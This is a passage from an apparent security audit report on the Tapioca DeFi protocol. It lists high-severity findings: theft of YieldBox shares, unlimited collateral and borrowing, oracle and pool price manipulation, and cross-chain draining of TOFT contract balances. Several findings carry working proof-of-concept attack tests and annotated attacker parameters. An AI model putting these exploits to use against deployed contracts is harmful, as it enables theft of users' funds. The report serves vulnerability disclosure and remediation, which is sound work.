High - allows stealing of arbitrary user yieldbox shares in BigBang contract and Singularity. In the case of BigBang this leads to infinite minting of USDO. Effectively draining all markets and LPs where USDO has value. In the case of Singularity this leads to infinite borrowing, allowing an attacker to obtain possession of all other users’ collateral in Singularity.
Proof of concept
Malicious actor can add any user shares that were approved to BigBang or Singularity contracts deployed. This way adversary is stealing user shares that he can unwrap to get underlying collateral provided.
it('allows steal other user YieldBox collateral shares',async()=>{const{wethBigBangMarket,weth,wethAssetId,yieldBox,deployer:userA,eoa1:userB,} =awaitloadFixture(register);awaitweth.approve(yieldBox.address,ethers.constants.MaxUint256);awaityieldBox.setApprovalForAll(wethBigBangMarket.address,true);constwethMintVal=ethers.BigNumber.from((1e18).toString()).mul(10,);awaitweth.freeMint(wethMintVal);constvalShare=awaityieldBox.toShare(wethAssetId,wethMintVal,false,);// User A deposit assets to yieldbox, receives sharesawaityieldBox.depositAsset(wethAssetId,userA.address,userA.address,0,valShare,);letuserABalance=awaityieldBox.balanceOf(userA.address,wethAssetId,)expect(userABalance.gt(0)).to.be.true;expect(userABalance.eq(valShare)).to.be.true;// User B adds collateral to big bang from user A sharesawaitexpect(wethBigBangMarket.connect(userB).addCollateral(userA.address,userB.address,false,wethMintVal,0,)).to.emit(yieldBox,"TransferSingle").withArgs(wethBigBangMarket.address,userA.address,wethBigBangMarket.address,wethAssetId,valShare);userABalance=awaityieldBox.balanceOf(userA.address,wethAssetId,)expect(userABalance.eq(0)).to.be.true;letcollateralShares=awaitwethBigBangMarket.userCollateralShare(userB.address,);expect(collateralShares.gt(0)).to.be.true;expect(collateralShares.eq(valShare)).to.be.true;// User B removes collateralawaitwethBigBangMarket.connect(userB).removeCollateral(userB.address,userB.address,collateralShares,);collateralShares=awaitwethBigBangMarket.connect(userB).userCollateralShare(userA.address,);expect(collateralShares.eq(0)).to.be.true;// User B ends up with User A shares in yieldboxletuserBBalance=awaityieldBox.balanceOf(userB.address,wethAssetId,)expect(userBBalance.gt(0)).to.be.true;expect(userBBalance.eq(valShare)).to.be.true;});
For Singularity contract this allows to increase collateralShare by the amount of assets provided as collateral infinitely leading tox / x + 1share of the collateral for the caller with no shares in the pool, where x is the number of times  theaddColateralis called, effectively allowing for infinite borrowing. As a consequence, the attacker can continuously increase their share of the collateral without limits, leading to potentially excessive borrowing of assets from the Singularity market.
it('allows to infinitely increase user collateral share in BigBang',async()=>{const{wethBigBangMarket,weth,wethAssetId,yieldBox,deployer:userA,eoa1:userB,} =awaitloadFixture(register);awaitweth.approve(yieldBox.address,ethers.constants.MaxUint256);awaityieldBox.setApprovalForAll(wethBigBangMarket.address,true);constwethMintVal=ethers.BigNumber.from((1e18).toString()).mul(10,);awaitweth.freeMint(wethMintVal);constvalShare=awaityieldBox.toShare(wethAssetId,wethMintVal,false,);// User A deposit assets to yieldbox, receives sharesawaityieldBox.depositAsset(wethAssetId,userA.address,userA.address,0,valShare,);letuserABalance=awaityieldBox.balanceOf(userA.address,wethAssetId,)expect(userABalance.gt(0)).to.be.true;expect(userABalance.eq(valShare)).to.be.true;// User A adds collateral to BigBangawaitwethBigBangMarket.addCollateral(userA.address,userA.address,false,wethMintVal,0,);letbigBangBalance=awaityieldBox.balanceOf(wethBigBangMarket.address,wethAssetId,)expect(bigBangBalance.eq(valShare)).to.be.true;letuserACollateralShare=awaitwethBigBangMarket.userCollateralShare(userA.address,);expect(userACollateralShare.gt(0)).to.be.true;expect(userACollateralShare.eq(valShare)).to.be.true;letuserBCollateralShare=awaitwethBigBangMarket.userCollateralShare(userB.address,);expect(userBCollateralShare.eq(0)).to.be.true;// User B is able to increase his share to 50% of the whole collateral addedawaitexpect(wethBigBangMarket.connect(userB).addCollateral(wethBigBangMarket.address,userB.address,false,wethMintVal,0,)).to.emit(yieldBox,"TransferSingle")userBCollateralShare=awaitwethBigBangMarket.userCollateralShare(userB.address,);expect(userBCollateralShare.gt(0)).to.be.true;expect(userBCollateralShare.eq(valShare)).to.be.true;// User B is able to increase his share to 66% of the whole collateral addedawaitexpect(wethBigBangMarket.connect(userB).addCollateral(wethBigBangMarket.address,userB.address,false,wethMintVal,0,)).to.emit(yieldBox,"TransferSingle")userBCollateralShare=awaitwethBigBangMarket.userCollateralShare(userB.address,);expect(userBCollateralShare.gt(0)).to.be.true;expect(userBCollateralShare.eq(valShare.mul(2))).to.be.true;// ....});
In the BigBang contract, this vulnerability allows a user to infinitely increase their collateral shares by providing collateral repeatedly. As a result, the user can artificially inflate their collateral shares provided, potentially leading to an excessive borrowing capacity. By continuously adding collateral without limitations, the user can effectively borrow against any collateral amount they desire, which poses a significant risk to USDO market.
it('allows infinite borrow of USDO',async()=>{const{wethBigBangMarket,weth,wethAssetId,yieldBox,deployer:userA,eoa1:userB,} =awaitloadFixture(register);awaitweth.approve(yieldBox.address,ethers.constants.MaxUint256);awaityieldBox.setApprovalForAll(wethBigBangMarket.address,true);constwethMintVal=ethers.BigNumber.from((1e18).toString()).mul(10,);awaitweth.freeMint(wethMintVal);constvalShare=awaityieldBox.toShare(wethAssetId,wethMintVal,false,);// User A deposit assets to yieldbox, receives sharesawaityieldBox.depositAsset(wethAssetId,userA.address,userA.address,0,valShare,);letuserABalance=awaityieldBox.balanceOf(userA.address,wethAssetId,)expect(userABalance.gt(0)).to.be.true;expect(userABalance.eq(valShare)).to.be.true;// User A adds collateral to BigBangawaitwethBigBangMarket.addCollateral(userA.address,userA.address,false,wethMintVal,0,);letbigBangBalance=awaityieldBox.balanceOf(wethBigBangMarket.address,wethAssetId,)expect(bigBangBalance.eq(valShare)).to.be.true;letuserACollateralShare=awaitwethBigBangMarket.userCollateralShare(userA.address,);expect(userACollateralShare.gt(0)).to.be.true;expect(userACollateralShare.eq(valShare)).to.be.true;awaitwethBigBangMarket.borrow(userA.address,userA.address,"7450000000000000000000");awaitexpect(wethBigBangMarket.borrow(userA.address,userA.address,"7450000000000000000000")).to.be.reverted;awaitexpect(wethBigBangMarket.addCollateral(wethBigBangMarket.address,userA.address,false,wethMintVal,0,)).to.emit(yieldBox,"TransferSingle")awaitwethBigBangMarket.borrow(userA.address,userA.address,"7500000000000000000000");awaitexpect(wethBigBangMarket.addCollateral(wethBigBangMarket.address,userA.address,false,wethMintVal,0,)).to.emit(yieldBox,"TransferSingle")awaitwethBigBangMarket.borrow(userA.address,userA.address,"7530000000000000000000");// ....});
Recommended Mitigation Steps
Check allowed to borrow shares amount after evaluating equivalent them
0xRektora (Tapioca) confirmed via duplicate issue 55

[H-06] BalancerStrategy_withdrawusesBPT_IN_FOR_EXACT_TOKENS_OUTwhich can be attack to cause loss to all depositors
Submitted byGalloDaSballo
Withdrawals can be manipulated to cause complete loss of all tokens.
The BalancerStrategy accounts for user deposits in terms of the BPT shares they contributed, however, for withdrawals, it estimates the amount of BPT to burn based on the amount of ETH to withdraw, which can be manipulated to cause a total loss to the Strategy.
Deposits of weth are done via userData.joinKind set to1, which is extracted here in the generic Pool Logic:https://etherscan.io/address/0x5c6ee304399dbdb9c8ef030ab642b10820db8f56#code#F24#L49
The interpretation (by convention is shown here):https://etherscan.io/address/0x5c6ee304399dbdb9c8ef030ab642b10820db8f56#code#F24#L49
enum JoinKind { INIT, EXACT_TOKENS_IN_FOR_BPT_OUT, TOKEN_IN_FOR_EXACT_BPT_OUT }
Which means that the deposit is usingEXACT_TOKENS_IN_FOR_BPT_OUTwhich is safe in most circumstances (Pool Properly Balanced, with minimum liquidity).
BPT_IN_FOR_EXACT_TOKENS_OUTis vulnerable to manipulation
_vaultWithdrawuses the following logic to determine how many BPT to burn:
https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/balancer/BalancerStrategy.sol#L224-L242
uint256[]memoryminAmountsOut=newuint256[](poolTokens.length);for(uint256i=0;i<poolTokens.length;i++) {if(poolTokens[i] ==address(wrappedNative)) {minAmountsOut[i] =amount;index=int256(i);}else{minAmountsOut[i] =0;}}IBalancerVault.ExitPoolRequestmemoryexitRequest;exitRequest.assets=poolTokens;exitRequest.minAmountsOut=minAmountsOut;exitRequest.toInternalBalance=false;exitRequest.userData=abi.encode(2,exitRequest.minAmountsOut,pool.balanceOf(address(this)));
This query logic is using2, which Maps out toBPT_IN_FOR_EXACT_TOKENS_OUTwhich means Exact Out, with any (all) BPT IN, this means that the swapper is willing to burn all tokens:https://etherscan.io/address/0x5c6ee304399dbdb9c8ef030ab642b10820db8f56#code#F24#L51
enum ExitKind { EXACT_BPT_IN_FOR_ONE_TOKEN_OUT, EXACT_BPT_IN_FOR_TOKENS_OUT, BPT_IN_FOR_EXACT_TOKENS_OUT }
This meets the 2 prerequisite for stealing value from the vault by socializing loss due to single sided exposure:
The request is for at leastamountWETHThe request is usingBPT_IN_FOR_EXACT_TOKENS_OUT
Which means the strategy will accept any slippage, in this case 100%, causing it to take a total loss for the goal of allowing a withdrawal, at the advantage of the attacker and the detriment of all other depositors.
POC
The requirement to trigger the loss are as follows:
Deposit to have some amount of BPTs deposited into the strategyImbalance the Pool to cause pro-rata amount of single token to require burning a lot more BPTsWithdraw from the strategy, the strategy will burn all of the BPTs it owns (more than the shares)Rebalance the pool with the excess value burned from the strategy
Further Details
Specifically, in withdrawing one Depositor Shares, the request would end up burning EVERYONEs shares, causing massive loss to everyone.
This has already been exploited and explained in Yearns Disclosure:
https://github.com/yearn/yearn-security/blob/master/disclosures/2022-01-30.md
More specifically this finding can cause a total loss, while trying to withdraw tokens for a single user, meaning that an attacker can setup the pool to cause a complete loss to all other stakers.
Mitigation Step
UseEXACT_BPT_IN_FOR_TOKENS_OUTand denominate the Strategy in LP tokens to avoid being attacked via single sided exposure.
cryptotechmaker (Tapioca) confirmed

[H-07] Usage ofBalancerStrategy.updateCachewill cause single sided Loss, discount to Depositor and to OverBorrow from Singularity
Submitted byGalloDaSballo, also found bycarrotsmuggler,kaden, andcergyk
The BalancerStrategy uses a cached value to determine it’s balance in pool for which it takes Single Sided Exposure.
This means that the Strategy has some BPT tokens, but to price them, it’s callingvault.queryExitwhich simulates withdrawing the LP in a single sided manner.
Due to the single sided exposure, it’s trivial to perform a Swap, that will change the internal balances of the pool, as a way to cause the Strategy to discount it’s tokens.
By the same process, we can send more ETH as a way to inflate the value of the Strategy, which will then be cached.
Since_currentBalanceis a view-function, the YieldBox will accept these inflated values without a way to dispute them
https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/balancer/BalancerStrategy.sol#L138-L147
function_deposited(uint256amount)internaloverridenonReentrant{uint256queued=wrappedNative.balanceOf(address(this));if(queued>depositThreshold) {_vaultDeposit(queued);emitAmountDeposited(queued);}emitAmountQueued(amount);updateCache();/// @audit this is updated too late (TODO PROOF)}
POC
Imbalance the pool (Sandwich A)UpdateupdateCacheDeposit into YieldBox, YieldBox is using aviewfunction, meaning it will use the manipulated strategy_currentBalance_depositedtrigger anupdateCacheRebalance the Pool (Sandwich B)CallupdateCacheagain to bring back the rate to a higher valueWithdraw at a gain
Result
Imbalance Up -> Allows OverBorrowing and causes insolvency to the protocol
Imbalance Down -> Liquidate Borrowers unfairly at a profit to the liquidator
Sandwhiching the Imbalance can be used to extract value from the strategy and steal user deposits as well
Mitigation
Use fair reserve math, avoid single sided exposure (use the LP token as underlying, not one side of it)
cryptotechmaker (Tapioca) confirmed

[H-08]LidoEthStrategy._currentBalanceis subject to price manipulation, allows overborrowing and liquidations
Submitted byGalloDaSballo, also found byladboy233,carrotsmuggler,kaden,cergyk, andrvierdiiev
The strategy is pricing stETH as ETH by asking the pool for it’s return value
This is easily manipulatable by performing a swap big enough
https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/lido/LidoEthStrategy.sol#L118-L125
function_currentBalance()internalviewoverridereturns(uint256amount) {uint256stEthBalance=stEth.balanceOf(address(this));uint256calcEth=stEthBalance>0?curveStEthPool.get_dy(1,0,stEthBalance)// TODO: Prob manipulatable view-reentrancy:0;uint256queued=wrappedNative.balanceOf(address(this));returncalcEth+queued;}/// @dev deposits to Lido or queues tokens if the 'depositThreshold' has not been met yetfunction_deposited(uint256amount)internaloverridenonReentrant{uint256queued=wrappedNative.balanceOf(address(this));if(queued>depositThreshold) {require(!stEth.isStakingPaused(),"LidoStrategy: staking paused");INative(address(wrappedNative)).withdraw(queued);stEth.submit{value:queued}(address(0));//1:1 between eth<>stEth // TODO: Prob cheaper to buy stETHemitAmountDeposited(queued);return;}emitAmountQueued(amount);}
POC
Imbalance the Pool to overvalue the stETHOverborrow and Make the Singularity InsolventImbalance the Pool to undervalue the stETHLiquidate all Depositors (at optimal premium since attacker can control the price change)
Coded POC
Logs
[PASS] testSwapStEth() (gas:372360)Initial Price5443663537732571417920Changed Price2187071651284977907921Initial Price2187071651284977907921Changed Price1073148438886623970
[PASS] testSwapETH() (gas:300192)Logs:value100000000000000000000000Initial Price5443663537732571417920Changed Price9755041616702274912586value700000000000000000000000Initial Price9755041616702274912586Changed Price680711874102963551173181
Considering that swap fees are 1BPS, the attack is profitable at very low TVL
// SPDX-License Identifier: MITpragmasolidity^0.8.0;import"forge-std/Test.sol";import"forge-std/console2.sol";interfaceICurvePoolWeird{functionadd_liquidity(uint256[2]memoryamounts,uint256min_mint_amount)externalpayablereturns(uint256);functionremove_liquidity(uint256_amount,uint256[2]memory_min_amounts)externalreturns(uint256[2]memory);}interfaceICurvePool{functionadd_liquidity(uint256[2]memoryamounts,uint256min_mint_amount)externalpayablereturns(uint256);functionremove_liquidity(uint256_amount,uint256[2]memory_min_amounts)externalreturns(uint256[2]memory);functionget_virtual_price()externalviewreturns(uint256);functionremove_liquidity_one_coin(uint256_token_amount,int128i,uint256_min_amount)external;functionget_dy(int128i,int128j,uint256dx)externalviewreturns(uint256);functionexchange(int128i,int128j,uint256dx,uint256min_dy)externalpayablereturns(uint256);}interfaceIERC20{functionbalanceOf(address)externalviewreturns(uint256);functionapprove(address,uint256)externalreturns(bool);functiontransfer(address,uint256)externalreturns(bool);}contractSwapperisTest{ICurvePoolpool=ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);IERC20stETH=IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);uint256TEN_MILLION_USD_AS_ETH=5455e18;// Rule of thumb is 1BPS cost means we can use 5 Billion ETH and still befunctionswapETH()externalpayable{console2.log("value",msg.value);console2.log("Initial Price",pool.get_dy(1,0,TEN_MILLION_USD_AS_ETH));pool.exchange{value:msg.value}(0,1,msg.value,0);// Swap all yolo// curveStEthPool.get_dy(1, 0, stEthBalance)console2.log("Changed Price",pool.get_dy(1,0,TEN_MILLION_USD_AS_ETH));}functionswapStEth()external{console2.log("Initial Price",pool.get_dy(1,0,TEN_MILLION_USD_AS_ETH));// Always approve exact ;)uint256amt=stETH.balanceOf(address(this));stETH.approve(address(pool),stETH.balanceOf(address(this)));pool.exchange(1,0,amt,0);// Swap all yolo// curveStEthPool.get_dy(1, 0, stEthBalance)console2.log("Changed Price",pool.get_dy(1,0,TEN_MILLION_USD_AS_ETH));}receive()externalpayable{}}contractCompoundedStakesFuzzisTest{Swapperc;IERC20token=IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);functionsetUp()public{c=newSwapper();}functiontestSwapETH()public{deal(address(this),100_000e18);c.swapETH{value:100_000e18}();/// 100k ETH is enough to double the pricedeal(address(this),700_000e18);c.swapETH{value:700_000e18}();/// 700k ETH is enough to double the price}functiontestSwapStEth()public{vm.prank(0x1982b2F5814301d4e9a8b0201555376e62F82428);// AAVE stETH // Has 700k ETH, 100k is sufficienttoken.transfer(address(c),100_000e18);c.swapStEth();vm.prank(0x1982b2F5814301d4e9a8b0201555376e62F82428);// AAVE stETH // Another one for good measuretoken.transfer(address(c),600_000e18);c.swapStEth();}}
Mitigation
Use the Chainlink stETH / ETH Price Feed or Ideally do not expose the strategy to any conversion, simply deposit and withdraw stETH directly to avoid any risk or attack in conversions
https://data.chain.link/arbitrum/mainnet/crypto-eth/steth-eth
https://data.chain.link/ethereum/mainnet/crypto-eth/steth-eth
0xRektora (Tapioca) confirmed via duplicate issue 828

[H-09]TricryptoLPStrategy.compoundAmountalways returns 0 because it’s using staticall vs call
Submitted byGalloDaSballo
compoundAmountwill always try to sell 0 tokens because thestaticallwill revert since the function changes storage incheckpoint
This causes thecompoundAmountto always return 0, which means that the Strategy is underpriced at all times allowing to Steal all Rewards via:
Deposit to own a high % of ownerhsip in the strategy (shares are underpriced)Compound (shares socialize the yield to new total supply, we get the majority of that)Withdraw (lock in immediate profits without contributing to the Yield)
POC
This Test is done on the Arbitrum Tricrypto Gauge with Foundry
1 is the flag value for a revert
0 is the expected value
We get 1 when we use staticcall since the call reverts internally
We get 0 when we use call since the call doesn’t
The comment in the Gauge Code is meant for usage off-chain, onChain you must accrue (or you could use a Accrue Then Revert Pattern, similar to UniV3 Quoter)
NOTE: The code for Mainnet is the same, so it will result in the same impacthttps://etherscan.io/address/0xDeFd8FdD20e0f34115C7018CCfb655796F6B2168#code#L375
Foundry POC
forge test --match-test test_callWorks --rpc-url https://arb-mainnet.g.alchemy.com/v2/ALCHEMY_KEY
Which will revert sincecheckpointis a non-view function and staticall reverts if any state is changed
https://arbiscan.io/address/0x555766f3da968ecbefa690ffd49a2ac02f47aa5f#code#L168
// SPDX-License Identifier: MITpragmasolidity^0.8.0;import"forge-std/Test.sol";import"forge-std/console2.sol";contractGaugeCallTestisTest{// Arb Tricrypto GaugeaddresslpGauge=0x555766f3da968ecBefa690Ffd49A2Ac02f47aa5f;functionsetUp()public{}functiondoTheCallView()internalreturns(uint256) {(boolsuccess,bytesmemoryresponse) =address(lpGauge).staticcall(abi.encodeWithSignature("claimable_tokens(address)",address(this)));uint256claimable=1;if(success) {claimable=abi.decode(response, (uint256));}returnclaimable;}functiondoTheCallCall()internalreturns(uint256) {(boolsuccess,bytesmemoryresponse) =address(lpGauge).call(abi.encodeWithSignature("claimable_tokens(address)",address(this)));uint256claimable=1;if(success) {claimable=abi.decode(response, (uint256));}returnclaimable;}functiontest_callWorks()public{uint256claimableView=doTheCallView();assertEq(claimableView,1);// Return 1 which is our flag for failureuint256claimableNonView=doTheCallCall();assertEq(claimableNonView,0);// Return 0 which means we read the proper value}}
Mitigation Step
You should use a non-view function like incompound
cryptotechmaker (Tapioca) confirmed

[H-10] Liquidated USDO from BigBang not being burned after liquidation inflates USDO supply and can threaten peg permanently
Submitted byunsafesol, also found bypeakbolt,0xnev,rvierdiiev, and0xRobocop
Absence of proper USDO burn after liquidation in the BigBang market results in a redundant amount of USDO being minted without any collateral or backing. Thus, the overcollaterization of USDO achieved through BigBang will be eventually lost and the value of USDO in supply (1USDO = 1$) will exceed the amount of collateral locked in BigBang. This has multiple repercussions- the USDO peg will be threatened and yieldBox will have USDO which has virtually no value, resulting in all the BigBang strategies failing.
Proof of Concept
According to the Tapioca documentation, the BigBang market mints USDO when a user deposits sufficient collateral and borrows tokens. When a user repays the borrowed USDO, the market burns the borrowed USDO and unlocks the appropriate amount of collateral. This is essential to the peg of USDO, since USDO tokens need a valid collateral backing.
While liquidating a user as well, the same procedure should be followed- after swapping the user’s collateral for USDO, the repaid USDO (with liquidation) must be burned so as to sustain the USDO peg. However, this is not being done.
As we can see here:https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L618-L637, the collateral is swapped for USDO, and fee is extracted and transferred to the appropriate parties, but nothing is done for the remaining USDO which was repaid. At the same time, this was done correctly done in BigBang#_repay for repayment here:https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L734-L736.
This has the following effects:
The BigBang market now has redundant yieldBox USDO shares which have no backing.The redundant USDO is now performing in yieldBox strategies of tapioca.The USDO eventually becomes overinflated and exceeds the value of underlying collateral.The strategies start not performing since they have unbacked USDO, and the USDO peg is lost as well since there is no appropriate amount of underlying collateral.
Recommended Mitigation Steps
Burn the USDO acquired through liquidation after extracting fees for appropriate parties.
0xRektora (Tapioca) confirmed

[H-11] TOFTexerciseOptioncan be used to steal all underlying erc20 tokens
Submitted bywindhustler, also found byAck
Unvalidated input data for theexerciseOptionfunction can be used to steal all the erc20 tokens from the contract.
Proof of Concept
EachBaseTOFTis a wrapper around anerc20token and extends theOFTV2contract to enable smooth cross-chain transfers through LayerZero.
Depending on the erc20 token which is used usually the erc20 tokens will be held on one chain and then only the shares ofOFTV2get transferred around (burnt on one chain, minted on another chain).
Subject to this attack isTapiocaOFTsormTapiocaOFTswhich store as anunderlying token an erc20 token(not native). In order to mintTOFTshares you need to deposit the underlying erc20 tokens into the contract, and you getTOFTshares.
The attack flow is the following:
The attack starts from theexerciseOption. Nothing is validated here and the only cost of the attack is theoptionsData.paymentTokenAmountwhich is burned from the attacker. This can be some small amount.When the message is received on the remote chain inside theexercisefunction it is important that nothing reverts for the attacker.For the attacker to go through the attacker needs to pass the following data:
function exerciseInternal(address from,uint256 oTAPTokenID,address paymentToken,uint256 tapAmount,address target,ITapiocaOptionsBrokerCrossChain.IExerciseLZSendTapDatamemory tapSendData,ICommonData.IApproval[] memory approvals) public {// pass zero approval so this is skippedif (approvals.length > 0) {_callApproval(approvals);}// target is the address which does nothing, but has the exerciseOption implementedITapiocaOptionsBroker(target).exerciseOption(oTAPTokenID,paymentToken,tapAmount);// tapSendData.withdrawOnAnotherChain = false so we enter else branchif (tapSendData.withdrawOnAnotherChain) {ISendFrom(tapSendData.tapOftAddress).sendFrom(address(this),tapSendData.lzDstChainId,LzLib.addressToBytes32(from),tapAmount,ISendFrom.LzCallParams({refundAddress: payable(from),zroPaymentAddress: tapSendData.zroPaymentAddress,adapterParams: LzLib.buildDefaultAdapterParams(tapSendData.extraGas)}));} else {// tapSendData.tapOftAddress is the address of the underlying erc20 token for this TOFT// from is the address of the attacker// tapAmount is the balance of erc20 tokens of this TOFTIERC20(tapSendData.tapOftAddress).safeTransfer(from, tapAmount);}}
So the attack is just simply transferring all the underlying erc20 tokens to the attacker.
The underlyingERC20token for eachTOFTcan be queried througherc20()function, and thetapAmountto pass isERC20balance of theTOFT.
This attack is possible because themsg.senderinside theexerciseInternalis the address of theTOFTwhich is the owner of all the ERC20 tokens that get stolen.
Recommended Mitigation Steps
Validate thattapSendData.tapOftAddressis the address ofTapOFTtoken either while sending the message or during the reception of the message on the remote chain.
0xRektora (Tapioca) confirmed

[H-12] TOFTremoveCollateralcan be used to steal all the balance
Submitted bywindhustler, also found by0x73696d616f
removeCollateral->removemessage pathway can be used to steal all the balance of theTapiocaOFTandmTapiocaOFTtokens in case when their underlying tokens is native.
TOFTs that hold native tokens are deployed witherc20 addressset to address zero, so whileminting you need to transfer value.
Proof of Concept
The attack needs to be executed by invoking theremoveCollateralfunction from any chain to chain on which the underlying balance resides, e.g. host chain of the TOFT.
When the message isreceived on the remote chain, I have placed in the comments below what are the params that need to be passed to execute the attack.
functionremove(bytesmemory_payload)public{(,,addressto,,ITapiocaOFT.IRemoveParamsmemoryremoveParams,ICommonData.IWithdrawParamsmemorywithdrawParams,ICommonData.IApproval[]memoryapprovals) =abi.decode(_payload,(uint16,address,address,bytes32,ITapiocaOFT.IRemoveParams,ICommonData.IWithdrawParams,ICommonData.IApproval[]));// approvals can be an empty array so this is skippedif(approvals.length>0) {_callApproval(approvals);}// removeParams.market and removeParams.share don't matterapprove(removeParams.market,removeParams.share);// removeParams.market just needs to be deployed by the attacker and do nothing, it is enough to implement IMarket interfaceIMarket(removeParams.market).removeCollateral(to,to,removeParams.share);// withdrawParams.withdraw =  true to enter the if blockif(withdrawParams.withdraw) {// Attackers removeParams.market contract needs to have yieldBox() function and it can return any addressaddressybAddress=IMarket(removeParams.market).yieldBox();// Attackers removeParams.market needs to have collateralId() function and it can return any uint256uint256assetId=IMarket(removeParams.market).collateralId();// removeParams.marketHelper is a malicious contract deployed by the attacker which is being transferred all the balance// withdrawParams.withdrawLzFeeAmount needs to be precomputed by the attacker to match the balance of TapiocaOFTIMagnetar(removeParams.marketHelper).withdrawToChain{value:withdrawParams.withdrawLzFeeAmount// This is not validated on the sending side so it can be any value}(ybAddress,to,assetId,withdrawParams.withdrawLzChainId,LzLib.addressToBytes32(to),IYieldBoxBase(ybAddress).toAmount(assetId,removeParams.share,false),removeParams.share,withdrawParams.withdrawAdapterParams,payable(to),withdrawParams.withdrawLzFeeAmount);}}
NeitherremoveParams.marketHelperorwithdrawParams.withdrawLzFeeAmountare validated on the sending side so the former can be the address of a malicious contract and the latter can be the TOFT’s balance of gas token.
This type of attack is possible because themsg.senderinIMagnetar(removeParams.marketHelper).withdrawToChainis the address of the TOFT contract which holds all the balances.
This is because:
Relayer submits the message tolzReceiveso he is themsg.sender.Inside the_blockingLzReceivethere is a call into its own public function so themsg.senderis theaddress of the contract.Inside the_nonBlockingLzReceivethere isdelegatecallinto a corresponding module which preserves themsg.senderwhich is the address of the TOFT.Inside the module there is a call towithdrawToChainand here themsg.senderis the address of the TOFT contract, so we can maliciously transfer all the balance of the TOFT.
Tools Used
Foundry
Recommended Mitigation Steps
It’s hard to recommend a simple fix since as I pointed out in my other issues the airdropping logic has many flaws.
One of the ways of tackling this issue is during theremoveCollateralto:
Do not allowadapterParamsparams to be passed as bytes but rather asgasLimitandairdroppedAmount, from which you would encode eitheradapterParamsV1oradapterParamsV2.And then on the receiving side check and send with value only the amount the user has airdropped.
0xRektora (Tapioca) confirmed and commented:
Related tohttps://github.com/code-423n4/2023-07-tapioca-findings/issues/1290

[H-13] TOFTtriggerSendFromcan be used to steal all the balance
Submitted bywindhustler
triggerSendFrom->sendFromDestinationmessage pathway can be used to steal all the balance of theTapiocaOFTandmTapiocaOFT` tokens in case when their underlying tokens is native gas token.
TOFTs that hold native tokens are deployed witherc20 addressset to address zero, so whileminting you need to transfer value.
Proof of Concept
The attack flow is the following:
Attacker callstriggerSendFromwithairdropAdapterParamsof typeairdropAdapterParamsV1which don’t airdrop any value on the remote chain but just deliver the message.On the other handlzCallParamsare of typeadapterParamsV2which are used to airdrop the balance from the destination chain to another chain to the attacker.
structLzCallParams{addresspayablerefundAddress;// => address of the attackeraddresszroPaymentAddress;// => doesn't matterbytesadapterParams;//=> airdropAdapterParamsV2}
Whereby thesendFromData.adapterParamswould be encoded in the following way:
functionencodeAdapterParamsV2()public{// https://layerzero.gitbook.io/docs/evm-guides/advanced/relayer-adapter-parameters#airdropuint256gasLimit=250_000;// something enough to deliver the messageuint256airdroppedAmount=maxairdropcapdefinedathttps://layerzero.gitbook.io/docs/evm-guides/advanced/relayer-adapter-parameters#airdrop. => 0.24 for ethereum, 1.32 for bsc, 681 for polygon etc.addressattacker=makeAddr("attacker");// => address of the attackerbytesmemoryadapterParams=abi.encodePacked(uint16(2),gasLimit,airdroppedAmount,attacker);}
When this is received on the remote inside thesendFromDestinationISendFrom(address(this)).sendFrom{value: address(this).balance}is instructed by the maliciousISendFrom.LzCallParams memory callParamsto actually airdrop the max amount allowed by LayerZero to the attacker on thelzDstChainId.Since there is a cap on the maximum airdrop amount this type of attack would need to be executed multiple times to drain the balance of the TOFT.
The core issue at play here is thatBaseTOFTdelegatecalls into theBaseTOFTOptionsModuleand thus the BaseTOFT is themsg.senderforsendFromfunction.
There is also another simpler attack flow possible:
SincesendFromDestinationpasses as value whole balance of the TapiocaOFT it is enough to specify the refundAddress incallParamsas the address of the attacker.This way the whole balance will be transferred to the_lzSendand any excess will be refunded to the_refundAddress.This is how layer zero works.
Tools Used
Foundry
Recommended Mitigation Steps
One of the ways of tackling this issue is during thetriggerSendFromto:
Not allowingairdropAdapterParamsandsendFromData.adapterParamsparams to be passed as bytes but rather asgasLimitandairdroppedAmount, from which you would encode eitheradapterParamsV1oradapterParamsV2.And then on the receiving side check and send with value only the amount the user has airdropped.
// Only allow the airdropped amount to be used for another messageISendFrom(address(this)).sendFrom{value:aidroppedAmount}(from,lzDstChainId,LzLib.addressToBytes32(from),amount,callParams);
0xRektora (Tapioca) confirmed

[H-14] All assets of (m)TapiocaOFT can be stealed by depositing to strategy cross chain call with 1 amount but maximum shares possible
Submitted by0x73696d616f
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/BaseTOFT.sol#L224
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/BaseTOFT.sol#L450
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTStrategyModule.sol#L47
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTStrategyModule.sol#L58
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTStrategyModule.sol#L154
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTStrategyModule.sol#L181-L185
https://github.com/Tapioca-DAO/YieldBox/blob/f5ad271b2dcab8b643b7cf622c2d6a128e109999/contracts/YieldBox.sol#L118
Attacker can be debited only the least possible amount (1) but send theshareargument as the maximum possible value corresponding to theercbalance of(m)TapiocaOFT. This would enable the attacker to steal all theercbalance of the(m)TapiocaOFTcontract.
Proof of Concept
